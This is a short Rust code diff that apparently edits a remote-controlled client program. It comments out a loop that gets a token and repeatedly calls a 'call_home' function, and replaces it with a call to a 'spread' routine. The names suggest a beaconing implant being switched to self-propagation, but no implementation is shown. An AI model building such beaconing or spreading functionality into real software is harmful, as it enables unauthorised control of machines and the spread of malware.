@@ -5,6 +5,7 @@ use std::{
 //use std::borrow::Borrow;
 use models::Task;
 use rand::Rng;
+use crate::tasks::spread;
 
 
 mod communication;
@@ -63,6 +64,7 @@ async fn initialise_client() -> String {
 
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
+    /*
     let token: String = initialise_client().await;
     loop {
         call_home(&token).await;
@@ -71,5 +73,8 @@ async fn main() -> Result<(), anyhow::Error> {
         // Remove break when the client is supposed to run forever
         break;
     }
+     */
+
+    spread();
     Ok(())
 }
